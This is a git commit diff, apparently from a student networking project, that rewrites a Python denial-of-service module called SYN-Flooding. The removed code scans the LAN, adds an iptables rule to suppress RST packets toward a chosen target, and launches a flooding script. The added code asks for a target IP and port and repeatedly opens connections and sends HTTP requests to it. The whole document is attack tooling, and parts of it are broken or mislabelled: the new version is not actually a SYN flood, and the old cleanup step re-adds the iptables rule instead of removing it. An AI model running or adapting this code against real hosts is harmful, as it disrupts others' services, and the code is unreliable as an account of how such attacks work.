13d1e5a7dec2f79bcad81b1fd1d1524055745d14
JoKoenig <jok6402@thi.de>
2015-12-14 16:11:03 +0100

    text_file_store

--- Netzwerke/dos/synflooding.py
+++ Netzwerke/dos/synflooding.py
@@ -1,60 +1,47 @@
-######
-# Module:   SYN-Flooding
-# Author:   S.Schuster
-# Date:     2015/11/14
-# Version:  1.0
+#!/usr/bin/python
+
 #
-# Description: Script for automation SYN-Flooding on HTTP-Connections against
-# self-defined host
+# Description: Script to SYN-Flooding target ip and port
+# address
 #
 ###############################
 # Log:
-# 2015/11/14    S.S - Initial
-# 2015/11/14    S.S - Done
+# 2015/12/13    S.S - Initial
+# 2015/12/14    S.S - Version 1.0 implemented
+# 2015/12/14	S.S - help()-function implemented
 ################################
 
 
 import os
+import sys
 import subprocess
+import socket
 import attackBase
 
 class SYNFlooding(attackBase.Attack):
-	
-	host = "127.0.0.1"
-	interface = "eth0"
-	port = "80"
-	amount = "100"
 
-	def start():
+	attackedHost = ""
+	attackedPort = 80
+	numberOfAttacks = 0
 
-		print "### SNY-Flooding ### \n\n"
-		print "Available interfaces: \n"
-		subprocess.call(["ls", "/sys/class/net"])
-                interface = raw_input("\nSelect interface: ")
-
-		print "\n Scan hosts (LAN) ..."
-                subprocess.call(["arp-scan", "--interface="+interface,  "--localnet"])
-
-                print "Insert host from LAN that should be attacked \n"
-		host = raw_input("Host-IP: ")
-
-		print "Insert (TCP)-Port that should be flooded \n"
-		port = raw_input("Port: (e.g. 80(http), 443 (https)")
-
-		print "Insert number of SYN-Packets that should be sent to host (X for unlimited \”")
-		amount = raw_input("Number of SYN-Packets: ")
-
-		 # add iptaple-rule for OUTPUT that no RST-Flag will be sent to attacked host
-                subprocess.call(["iptables", "-A", "OUTPUT", "-p", "tcp", "-d", host, "-tcp-flags", "RST", "RST", "-j", "DROP"])
-
-		print "SYN-Flooding is starting now ..."
-		supbrocess.Popen(["sudo", "python", "flooding.py", "-d", host, "-c", amount, "-p", port])
-
-		# delete iptables-rules after syn-flooding is finished
-		subprocess.call(["iptables", "-A", "OUTPUT", "-p", "tcp", "-d", host, "-tcp-flags", "RST", "RST", "-j", "DROP"])
-
-
-
-	def help():
-		print "ToDo 14-11-2015"
+	def start(self):
+		self.attackedHost = raw_input("Please enter IP of attacked host: ")
+		self.attackedPort = int(raw_input("Please enter attacked destination port: "))
+		self.numberOfAttacks = int(raw_input("Please enter how many times would you like to send syn packets: "))
+		print "Attacked Host: " + self.attackedHost + " on TCP port: " + str(self.attackedPort)
+		for i in range(1, self.numberOfAttacks):
+			self.flooding(i)
 		
+	def flooding(self, i):
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		sock.connect((self.attackedHost, self.attackedPort))
+		print "SYN flooding packet number " + str(i)
+		sock.send("GET / HTTP/1.1\r\n")
+		sock.send("Host: " + self.attackedHost + "\r\n\r\n")
+		sock.close()
+		
+		
+		
+
+	def help(self):
+		print "ToDo"
